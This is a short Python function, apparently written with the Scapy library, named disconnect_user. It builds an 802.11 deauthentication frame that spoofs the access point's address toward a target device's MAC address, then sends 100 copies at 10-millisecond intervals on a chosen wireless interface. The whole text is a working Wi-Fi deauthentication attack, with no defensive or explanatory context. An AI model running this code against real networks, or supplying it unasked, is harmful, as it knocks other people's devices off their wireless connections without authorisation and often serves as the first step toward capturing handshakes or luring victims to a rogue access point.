def disconnect_user(mac_address, access_point, interface):
	packet = RadioTap() / Dot11(addr1=mac_address,
					addr2=access_point,
					addr3=access_point)/ Dot11Deauth(reason=7)
	sendp(packet, inter=0.01, count=100,
		iface=interface, verbose=1)
